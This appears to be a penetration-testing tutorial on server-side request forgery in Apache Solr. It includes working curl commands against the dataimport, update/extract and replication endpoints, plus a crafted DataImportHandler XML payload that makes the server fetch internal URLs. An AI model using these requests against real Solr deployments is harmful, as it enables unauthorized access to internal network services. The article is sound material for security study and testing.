---
title: Exploiting SSRF Vulnerabilities in Apache Solr
description: Learn to exploit SSRF in Apache Solr using HTTP service interaction techniques.
keywords:
- Apache Solr
- SSRF
- HTTP APIs
- Solr core
- admin UI
- exploitation
- server-side request forgery
- dataimporthandler
- security vulnerability
---

# Apache Solr

## Context

This article demonstrates how to exploit Server-Side Request Forgery (SSRF) vulnerabilities in Apache Solr through HTTP-based service interactions. Readers should have prior knowledge of the HTTP protocol, web server architecture, Solr core structure, and SSRF exploitation techniques.

## Theory

### Apache Solr SSRF Attack Surface

Apache Solr is an open-source search platform that offers extensive HTTP APIs for core management and data operations. Solr's admin UI and core configuration endpoints can intentionally or unintentionally trigger outbound HTTP requests. When Solr's HTTP APIs do not properly validate input sources, attackers may exploit these functionalities to make the server perform HTTP requests to arbitrary URLs, controlled by the attacker or redirected to internal systems.

### Solr Core and Admin UI SSRF Vectors

A Solr core is essentially a logical index with its own configuration that is accessible via RESTful endpoints. The attack sequence potentially involves submitting a crafted HTTP request to Solr's admin API that references a URL. This URL can be internal to the network or external to the server. The Solr server, upon processing such a request, may make a server-side HTTP request to the attacker-supplied URL.

### HTTP Request Manipulation in Solr

Certain HTTP APIs in Solr, such as `/solr/{core}/dataimport` and `/solr/admin/cores`, support the loading of remote resources based on user-supplied URLs. Misconfigured or improperly validated URL schemes, including `http`, `https`, or even `file`, may allow for SSRF exploits if these are not sufficiently restricted.

## Practice

### SSRF via DataImportHandler (DIH) Config Upload

1. **Execute a cURL request:**

   ```bash
   curl -X POST 'http://<solr-host>:8983/solr/<core>/dataimport?command=full-import&dataConfig=<dataConfig-xml>' -H 'Content-Type: application/xml'
   ```

   This command uploads a carefully crafted `dataConfig` XML that references an internal HTTP resource.

2. **Crafted XML payload:**

   ```xml
   <dataConfig>
       <dataSource type="URLDataSource"/>
       <document>
           <entity name="e1" url="http://127.0.0.1:8080/internal" processor="XPathEntityProcessor"/>
       </document>
   </dataConfig>
   ```

   This XML payload directs Solr to fetch a local or internal HTTP resource as specified.

**Outcome:** Solr server makes HTTP requests to URLs provided by the attacker, potentially accessing internal resources.

### SSRF via Remote Streaming File Upload

1. **Execute a cURL request:**

   ```bash
   curl 'http://<solr-host>:8983/solr/<core>/update/extract?stream.url=http://127.0.0.1:8080/internal'
   ```

   This command directs Solr to fetch and process a remote file through the `stream.url` parameter.

**Outcome:** Solr will retrieve resources located on either remote or internal servers, facilitating SSRF to internal services.

### SSRF via Replication Handler

1. **Execute a cURL request:**

   ```bash
   curl 'http://<solr-host>:8983/solr/<core>/replication?command=fetchindex&masterUrl=http://127.0.0.1:8080/internal'
   ```

   By manipulating the `masterUrl` parameter, Solr is coerced into connecting to an internal URL.

**Outcome:** Solr establishes a connection to URLs controlled by an attacker or located within the internal network through the replication handler.

## Tools

- **curl**
- **Burp Suite**